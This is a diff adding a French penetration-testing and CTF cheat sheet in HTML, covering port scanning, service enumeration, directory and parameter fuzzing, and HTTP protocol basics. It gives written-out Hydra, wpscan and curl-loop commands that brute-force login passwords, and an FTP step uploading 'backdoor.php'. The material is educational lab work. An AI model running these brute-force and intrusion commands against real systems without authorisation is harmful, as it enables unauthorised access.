+				<div class="col-sm-12 map-color-text "><pre><code># nmap 10.10.10.4
+# nmap -A  10.10.10.4          : Scan les 1000 ports les plus utilisés. Cherche les versions des services et l'OS
+# nmap -sV -sC -p- 10.10.10.4  : scan les 655535 ports TCP et cherche les versions des services ouverts. 
+# nmap -sU 10.10.10.4          : scan des ports UDP (trés trés lent)
+    -sV : Tente d'identifier la version du service
+    -sC : Scanne avec les scripts NMap par défaut. Les scripts considérés comme sans risque.
+    -A  : Tente de détecter la version de l'OS, la version des services, utilise les scripts par défaut, et réalise un traceroute
+    -p- : Scanne les 65535 ports TCP
+    -sU : Scanne les ports UDP (trés long)
+    -oN nmap.log : output file
+</code></pre> 
+<p>On peut lancer ces trois commandes dans trois shells en parallèle.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=portidentification">Identification des services</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les services de type ftp, web, ldap tournent peuvent fonctionner sur n'importe quel port, mais utilisent généralement les ports qui leur sont réservés.
+Le port 80 par exemple est le port utilisé par les serveurs web pour HTTP.
+Le port 443 est le port pour HTTPS.</p>
+<pre><code>TCP
+    20: ftp data
+    21: ftp control
+    22: ssh
+    23: telnet
+    25: SMTP (mail)
+    37: Time protocol
+    53: Bind/DNS
+    69: TFTP (Trivial FTP)
+    80: HTTP
+    109: POP2
+    110: POP3
+    111: RPC Remote Procedure Call
+    137: Netbios Name Service
+    138: Netbios Datagram Service
+    139: Netbios Session Service
+    143: IMAP (mail)
+    161: SNMP
+    220: IMAP
+    389: LDAP
+    443: HTTPS
+    445: MS Active Directory, SMB
+    464: Kerberos
+    1521: Oracle Database
+    3000: Node JS
+    3306: MySQL
+UDP
+    69: TFTP
+    161: SNMP
+
+http://www.0daysecurity.com/penetration-testing/enumeration.html 
+</code></pre> </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=21FtpAnonymous">21: FTP - Anonymous</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les serveurs ftp permettent de transférer des fichiers.<br>
+Une fois connecté avec un login/password, il est possible de se déplacer dans l'arborescence des répertoire pour  d'uploader/downloader des fichiers.<br>
+Par défaut, le protocole est optimisé pour les fichiers textes. Ne pas oublier d'activer le mode binaire si nécessaire.<br>
+Un compte invité, ou anonymous permet sur certain serveur de télécharger librement des documents publics.<br>
+Le login est 'anonymous', le mot de passe est par convention le mail de l'invité.   </p>
+<pre><code>$ ftp 10.0.0.11
+Name (10.0.0.11:yolo): anonymous
+Password: yolo@yolospacehacker.com
+ftp&gt; pwd 
+ftp&gt; cd docs
+ftp&gt; ls 
+ftp&gt; bin
+ftp&gt; get flag.txt
+ftp&gt; put backdoor.php
+ftp&gt; bye
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=22Ssh">22: Ssh</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le port 22 est le port ssh, qui permet l'accès distant à un terminal.<br>
+Il est possible de se connecter avec un login/password.</p>
+<pre><code>$ ssh yolo@10.0.0.11
+</code></pre>
+<p>Il est aussi possible de se connecter avec un fichier de clef privé.    </p>
+<pre><code>$ ssh -i id_rsa yolo@10.0.0.11
+</code></pre>
+<p>Le fichier de clef privée ne doit être en lecture que par son propriétaire.   </p>
+<pre><code>$ chmod 600 id_rsa
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTProbots">80: HTTP - Robots.txt</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le fichier robots.txt, quand il existe, est enregistré à la racine d'un site web.
+Il contient une liste des ressources du site qui ne sont pas censées être indexées par les robots d'indexation des moteurs de recherche.<br>
+Par convention, les robots consultent robots.txt avant d'indexer un site Web.<br>
+Son contenu peut donc nous interresser.</p>
+<pre><code>http://10.10.10.8/robots.txt
+</code></pre>
+<p>Plus d'info : <a href="https://fr.wikipedia.org/wiki/Protocole_d%27exclusion_des_robots"></a><a href="https://fr.wikipedia.org/wiki/Protocole_d%27exclusion_des_robots">https://fr.wikipedia.org/wiki/Protocole_d%27exclusion_des_robots</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPsrc">80: HTTP - Page source</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les développeurs laissent parfois des informations utiles, voire des mots de passe dans les commentaires du code. Ce sont souvent des urls,ou des champs de formulaires utilisés pour les tests.<br><br></p>
+<div>Commentaires dans le code source HTML ou JS de la page</div>
+<pre><code>/* Secret code */
+&lt;!--- Secret code ---&gt;
+</code></pre>
+<div>Elements HTML cachés</div>
+<pre><code>&lt;p hidden&gt;Secret code.&lt;/p&gt;
+&lt;label style='display: none'&gt;Secret code.&lt;/label&gt;
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPdirs">80: HTTP - Brute force de fichiers et répertoires</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Bruteforcer un site web consiste à tester la présence de pages accessibles, telles /register, /register.php, /admin, /upload, /users/login.txt, /admin/password.sav, ...
+Pour celà il existe des listes de répertoires et de noms de fichiers fréquemment présents sur les serveurs web.<br>
+<br>
+Une fois la techno du serveur connue (php, java, wordpress, joomla, ...) il est possible d'utiliser des listes optimisées, et ne chercher que les extensions adaptées: php, php4, php5, exe, jsp, ...<br>
+Il est aussi possible de chercher des fichiers aux extensions intéressantes : cfg, txt, sav, jar, zip, sh, ...</p>
+<p><br>
+Logiciels de brute force usuels :</p>
+<ul>
+<li>dirb : Ligne de commande. A utiliser pour un check rapide avec sa liste 'common.txt'.</li>
+<li>gobuster : Ligne de commande. A utiliser avec la liste 'directory-list-2.3-medium.txt' de dirbuster</li>
+<li>dirbuster : Interface graphique. Visuel mais pas forcément le meilleur choix</li>
+</ul>
+<p>Il est crucial de bien choisir la liste de répertoires/noms de fichiers:</p>
+<ul>
+<li>/usr/share/wordlists/dirb/common.txt : petite liste bien construite</li>
+<li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt : grosse liste. Normalement couvre tous les CTF.</li>   
+<li>https://github.com/danielmiessler/SecLists : Une fois à l'aise avec les deux listes précédentes, il est possible de trouver des listes plus optimisées sur ce git.
+</li><li>Sur les distribution Kali et Parrot, le répertoire /usr/share/wordlists contient des liens vers de nombreuses listes. Prenez le temps de le regarder en détail.</li>
+</ul>
+<p><br></p>
+<h5>Dirb</h5>
+<p>Dirb est préinstallé sur Kali ou Parrot. Si ce n'est pas le cas:</p>
+<pre><code>sudo apt-get install -y dirb
+</code></pre>
+<p>Lancer un scan rapide avec dirb, qui va utiliser sa liste 'common.txt':</p>
+<pre><code>dirb http://10.10.10.11
+</code></pre>
+<p><br>
+Rechercher les fichiers avec l'extension .php:</p>
+<pre><code>dirb http://10.10.10.11  -X .php
+</code></pre>
+<p><br></p>
+<h5>Gobuster</h5>
+<pre><code>https://github.com/OJ/gobuster
+</code></pre>
+<p>Le télécharger et l'installer en /opt</p>
+<pre><code>wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z
+sudo apt install p7zip-full
+7z x gobuster-linux-amd64.7z
+sudo cp gobuster-linux-amd64/gobuster /opt/gobuster
+chmod a+x /opt/gobuster
+</code></pre>
+<p>Bruteforce le site <a href="http://10.10.10.11">http://10.10.10.11</a>, avec la liste directory-list-2.3-medium.txt, avec des extensions de fichier html,php,txt</p>
+<pre><code>/opt/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.11  -l -x html,php,txt
+</code></pre>
+<p>Pour une url en HTTPS, ajouter l'option de ligne de commande </p>
+<pre><code>-k : skip HTTPS ssl verification
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPwfuzz">80: HTTP - Bruteforcer les paramètres d'une Url</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><h5>Wfuzz</h5>
+<p><u>Fuzzer un id de 000 à 020</u></p>
+<pre><code>wfuzz -z range,000-020 http://satctrl.bahamas.ysh/?id=FUZZ
+</code></pre>
+<p><u>Fuzzer le nom d'un paramètre d'url</u></p>
+<pre><code>wfuzz -z file,./burp-parameter-names.txt "http://satctrl.bahamas.ysh/action.php?FUZZ=aaaaaaa"
+</code></pre>
+<p>Faire un Ctrl-C, identifier le nombre de caractères des réponses. Par exemple 400.<br>
+Relancer en utilisant l'option --hh pour exclure les réponses ayant cette taille, et pouvoir facilement identifier les réponses générant une page différente.    </p>
+<pre><code>wfuzz -z file,./burp-parameter-names.txt "http://satctrl.bahamas.ysh/action.php?FUZZ=aaaaaaa" --hh 400    
+</code></pre> 
+<p><u>Fuzzer la valeur d'un paramètre d'url</u></p>
+<pre><code>wfuzz -z file,./burp-parameter-names.txt "http://satctrl.bahamas.ysh/action.php?command=FUZZ"
+</code></pre>
+<p>Faire un Ctrl-C, identifier le nombre de caractères des réponses. Par exemple 400.<br>
+Relancer en utilisant l'option --hh pour exclure les réponses ayant cette taille, et pouvoir facilement identifier les réponses générant une page différente. </p>
+<pre><code>wfuzz -z file,./burp-parameter-names.txt "http://satctrl.bahamas.ysh/action.php?FUZZ=aaaaaaa" --hh 400    
+</code></pre> 
+<p><u>Fuzzer un prefix fqdn</u></p>
+<pre><code>wfuzz -z file,./burp-parameter-names.txt "http://FUZZ.bahamas.ysh"
+wfuzz -z file,./burp-parameter-names.txt "http://FUZZ.bahamas.ysh" --hh 400    
+</code></pre> 
+<p><u>Listes utiles</u><br>
+<a href="/hackersguide/subdomains-top1million-5000.txt" target="_null">subdomains-top1million-5000.txt</a><br>
+<a href="/hackersguide/burp-parameter-names.txt" target="_null">burp-parameter-names.txt</a><br>
+From: <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPbrutebasicauth">80: HTTP - Basic Auth - Brute force</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><h5>Hydra</h5>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
+</code></pre>
+<pre><code>-l login 
+-P password file 
+-f server adress
+http-get : HTTP request type
+/monitoring : url path
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPbruteformpost">80: HTTP - Form HTTP Post - Authent brute force</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><h5>Hydra</h5>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form '/admin/login.php:username=^USER^&amp;password=^PASS^:F=Wrong password:H=Cookie\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4' -V
+</code></pre>
+<p>Attention si la réponse est un 302 Redirect, hydra ne va pas suivre et va générer un faux positif.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=80HTTPbruteformget">80: HTTP - Form HTTP GET - Brute force</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><h5>Hydra</h5>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.4 http-get-form '/login.php:username=^USER^&amp;password=^PASS^:F=Login failed:H=Cookie\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4' -V
+</code></pre>
+<p>Attention si la réponse est un 302 Redirect, hydra ne va pas suivre et va générer un faux positif.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=wordpress">CMS: Wordpress</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><h5>Wordpress</h5>
+<p>Format des urls</p>
+<pre><code>Posts : /index.php?p=22
+        /index.php/2017/04/12/hello-world/
+        /index.php/jobs/apply/8/
+Login : /wp-login/
+        /wp-login.php
+Uploaded files : /wp-content/uploads/%year%/%month%/%filename%
+</code></pre>
+<p>Fichier de config, et credentials de la base de donnée</p>
+<pre><code>/var/www/html/   
+wordpress/wp-config.php
+wordpress/htdocs/wp-config.php
+</code></pre>
+<h5>Wpscan</h5>
+<p>Wpscan connait la structure d'un site wordpress et va faire du brute force pour identifier les pages, le posts, les users, le thème, les plugins.<br>
+Les failles de wordpress viennent essentiellement des plugins non mis à jour. </p>
+<pre><code>wpscan --url http://10.10.10.10/wordpress/ -e
+--url : url de la page wordpress.
+-e : énumeration
+</code></pre>
+<p>Brute force du login</p>
+<pre><code>wpscan --url http://10.10.10.10/wordpress/  -P rockyou.txt -U admin
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=110POP3">110: POP3</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le protocole POP3 sert à relever ses mails sur un serveur distant.<br>
+Si vous avez les identifiants et mots de passe, connectez vous en netcat ou telnet.</p>
+<pre><code>$ nc 10.0.12.10 110
+</code></pre>
+<p>Une fois connecté, s'authentifier avec </p>
+<pre><code>USER XXXXXX
+PASS XXXXXX
+</code></pre>
+<p>Afficher la liste des mails avec:</p>
+<pre><code>LIST
+</code></pre>
+<p>Lire le mail numéro 1</p>
+<pre><code>RETR 1
+</code></pre>
+<p>Quitter le serveur.</p>
+<pre><code>QUIT
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=110POP3BF">110: POP3 Bruteforce</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'authentification POP3 peut être brute forcée avec hydra.</p>
+<pre><code>hydra -V -l username -P wordlist.txt 10.0.12.10 pop3
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=3306MySQL">3306: MySQL</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si vous avez les identifiants et mots de passe. Se connecter avec le client mysql.</p>
+<pre><code>mysql --host=HOST -u USER -p
+--host=précise le nom du serveur
+-u le login
+-p force la saisie du mot de passe.
+</code></pre>
+<p>Dumper le contenu de la base.</p>
+<pre><code>show databases; -- Liste les bases de données. 
+                -- La base 'information_schema' contient des informations internes à mysql ou mariadb. On peut généralement l'ignorer.
+use DATABASE;
+show tables;    -- Liste les tables
+SELECT * FROM TABLENAME;
+quit;
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=PORTKNOCK">Port knocking</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Pour rendre certains services invisibles aux scans, les serveurs peuvent utiliser une fonctionnalité de Port Knocking.<br>
+Les ports sensibles ne sont ouverts qu'une fois une séquence particulière de paquets reçus, idéalement en UDP.<br>
+Cette fonctionnalité peut être implémentée directement dans le routeur, le firewall ou l'application.
+Envoyer un unique paquet vide en UDP sur le port 1337</p>
+<pre><code>nc -u -z localhost 1337
+</code></pre>
+<p>Envoyer une série de paquets vides sur les port UDP 1337 4444 6666</p>
+<pre><code>nc -u -z localhost 1337 4444 6666
+</code></pre>
+<p>Envoyer un unique paquet contenant le message KnockKnockKnock sur le port UDP 1337</p>
+<pre><code>for i in 10124 11056 18639; do printf Knock | nc -u -q1 localhost $i; done
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_HTTP">HTTP
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTP0.9">HTTP 0.9</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le protocole HTTP est utilisé par les navigateurs web pour obtenir des documents hébergés par les serveurs.<br>
+Le navigateur se connecte en TCP à un serveur, sur le port 80 par défaut.<br>
+La requête minimale contient une commande (ici GET), une URL (/hello.txt), une ligne vide. </p>
+<pre><code>GET /hello.txt
+
+</code></pre>
+<p>La réponse contient directement le fichier.</p>
+<pre><code>Hello world
+</code></pre>
+<pre><code>$ printf 'GET /hello.txt \n\r\n' | nc localhost 8001
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTP1.1">HTTP 1.1</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>La version 1.1 du protocole HTTP est optimisée pour transférer des pages HTML complexes, et permet de négocier la langue et les formats d'encodages.<br>
+La requête minimale contient une commande (GET), une url (/hello.txt), la version (HTTP/1.1), le champ Host, une ligne vide.<br></p>
+<pre><code>GET /hello.txt HTTP/1.1
+Host: 10.10.10.11 80
+
+</code></pre>
+<p>La réponse contient une entête composée de nombreux champs (server, date,...), la longueur du contenu (13), et le contenu sous forme de texte.<br></p>
+<pre><code>HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/2.7.15+
+Date: Thu, 26 Dec 2019 17:06:12 GMT
+Content-type: text/html; charset=UTF-8
+Content-Length: 13
+
+Hello world
+
+</code></pre>
+<p>Les headers de la réponse sont des mines d'information sur le serveur, sa version...<br>
+Ici un serveur Apache en version 0.8.4 qui éxécute des scripts avec un interpréteur php en version 7.3.13.</p>
+<pre><code>HTTP/1.1 200 OK
+Server: Apache/0.8.4
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/7.3.13
+</code></pre>
+<pre><code>$ printf 'GET / HTTP/1.1\r\nHost: localhost 8001\r\n\r\n' | nc localhost 8001
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPCodes">HTTP Codes</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Code de réponse HTTP</p>
+<pre><code>    1xx informational response – the request was received, continuing process
+    2xx successful – the request was successfully received, understood, and accepted
+        200 OK
+    3xx redirection – further action needs to be taken in order to complete the request
+        301 Moved Permanently =&gt; Redirection
+        304 Not Modified
+    4xx client error – the request contains bad syntax or cannot be fulfilled
+        400 Bad request
+        401 Unauthorized
+        403 Forbidden
+        404 Not found
+    5xx server error – the server failed to fulfil an apparently valid request
+        500 Internal Server Error
+        502 Bad Gateway - The server was acting as a gateway or proxy and received an invalid response from the upstream server
+        503 Service Unavailable - The server cannot handle the request (because it is overloaded or down for maintenance)
+        504 Gateway Timeout - The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.
+    https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPCurlWget">Curl et Wget</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Télécharger un fichier :</p>
+<pre><code>$ wget http://localhost:8001/
+</code></pre>
+<p>Afficher le contenu de la réponse :</p>
+<pre><code>$ curl http://localhost:8001/
+</code></pre>
+<p>Afficher les headers, la requête et le contenu de la réponse :</p>
+<pre><code>$ curl -v http://localhost:8001/
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPHeader">HTTP: Entêtes</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les headers HTTP sont standardisés et sont riches en information.<br></p>
+<ul>
+<li>Host: Précise le site web destinataire de la requète.<br></li>
+<li>Referer: Adresse de la page web qui a généré la requète.<br></li>
+<li>User-Agent: Navigateur utilisé pour se connecter.</li>
+</ul>
+<p>Il est possible d'ajouter des headers personnels, tel 'X-MyHeader: value'</p>
+<pre><code>GET / HTTP/1.1
+Host: localhost:8001
+User-Agent: curl/7.58.0
+Accept: */*
+X-MyHeader: value
+
+</code></pre>
+<p>Pour ajouter un header avec curl : -H 'header: valeur'</p>
+<pre><code>$ curl -H 'X-MyHeader: value' http://localhost:8001
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPAgent">HTTP: User-Agent </a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le header des requêtes contient un champ User-Agent.<br>
+Il est utilisé par les navigateurs pour s'identifier et donner des information sur leur version.<br>
+Le serveur peut adapter la page à un vieux navigateur Internet Explorer ou un Firefox dernier cris.   </p>
+<p>Curl v7.68.0 utilise 'curl/7.68.0' comme User-Agent. Il est possible de définir la valeur du User-Agent avec l'option -A.</p>
+<pre><code>curl -A 'MyAgent' http://localhost:8001
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPParam">HTTP Get: les paramètres</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'URI permet de précider une ressource, et d'ajouter des paramètres.<br>
+Le premier paramètre est identifié par un ?, les suivants par un &amp;.<br>
+Si les paramètres contiennent des ? ou des &amp;, ils sont encodés sous la forme %3F et %26. On parle de Percent (%) encoding.<br>
+<a href="https://fr.wikipedia.org/wiki/Percent-encoding">https://fr.wikipedia.org/wiki/Percent-encoding</a><br></p>
+<p>Exemple:</p>
+<pre><code>$ curl 'http://localhost:8001/register.php?name=jean&amp;lastname=bon&amp;age=42&amp;admin=true'
+</code></pre>
+<p>Le shell unix utilisant le &amp; pour lancer des taches en arrière plan, il est impératif de mettre l'URL entre '.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormAuthSimple">HTTP Authentification Basic</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>HTTP dispose d'une fonctionnalité d'authentification basique. Il est possible ajouter un champ contenant un identifiant et un mot de passe en clair.<br>
+Ces informations sont mise sous la forme login:password, puis encodées en base64, et ajoutées dans l'entête de la requête:<br>
+Authorization: Basic bG9naW46cGFzc3dvcmQ=<br>
+<br>
+Exemple:</p>
+<pre><code>GET /hello.txt HTTP/1.1
+Host: localhost:8001
+Authorization: Basic bG9naW46cGFzc3dvcmQ=
+User-Agent: curl/7.58.0
+Accept: */*
+
+</code></pre>
+<p>Pour envoyer une requête avec des informations d'authentification avec curl: </p>
+<pre><code>$ curl -u login:password http://localhost:8001/hello.txt
+</code></pre>
+<p>Pour encoder un login:password dans le terminal</p>
+<pre><code>$ printf 'login:password' | base64
+bG9naW46cGFzc3dvcmQ=
+</code></pre>
+<p>Pour décoder du base64 dans le terminal</p>
+<pre><code>$ printf 'bG9naW46cGFzc3dvcmQ=' | base64 -d
+login:password
+</code></pre>
+<p>Pour tester une liste de mots de passe:</p>
+<pre><code>for i in `cat rockyou.txt`; do printf \n$i:; curl  -u admin:$i http://12.10.1.11/training-http-auth-simple.php; done
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormPost">FORM: méthode Post</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Quand une page web comporte un formulaire, elle peut envoyer le contenu des champs avec la méthode GET dans les paramètres de l'URL, ou avec la méthode POST dans le corps de la requète.<br>
+<br>
+Les valeurs en paramètres du GET apparaissent dans les logs, et sont limités en longueur.<br>
+Les valeurs en paramètres du POST n'apparaissent pas dans les logs, et ne sont pas limités en longueur. Il est ainsi possible d'uploader de gros fichiers.<br>
+Ces paramètres sont encodés avec le format 'Percent encoding'.<br>
+Exemple:</p>
+<pre><code>POST /login.php HTTP/1.1
+Host: 10.10.1.11
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+
+login=James&amp;password=007
+</code></pre>
+<p>Poster un formulaire avec curl:</p>
+<pre><code>$ curl -X POST -F 'username=admin' -F 'password=megapassword'  http://localhost:8001/
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormPostHTML">FORM: Trouver les champs du formulaire dans le code HTML</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les formulaires sont des objets HTML de base, définis par les balises &lt;form&gt; et &lt;/form&gt;<br>
+&lt;input name='xxx'&gt;: Nom des champs de type texte. <br>
+&lt;form action='xxx': URL a laquelle sera envoyé le formulaire. Si le champ est vide, le formulaire est envoyé à la URL.<br>
+Exemple:</p>
+<pre><code>&lt;form action="/action_page.php"&gt; 
+  First name: &lt;input type="text" name="firstname" value="Mickey"&gt;
+  Last name:  &lt;input type="text" name="lastname" value="Mouse"&gt;
+  &lt;input type="submit" value="Submit"&gt; 
+&lt;/form&gt; 
+</code></pre>
+<p>Poster un formulaire avec curl:</p>
+<pre><code>$ curl -X POST -F 'firstname=Mickey' -F 'lastname=Mouse'  http://12.10.1.11/action_page.php
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormGet">FORM: méthode Get</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les pages web comportant des formulaires utilisent généralement la commande POST, mais elles peuvent aussi utiliser une commande GET.<br>
+Dans ce cas, la valeur des paramètres sont directement passés comme argument dans la requète.<br>
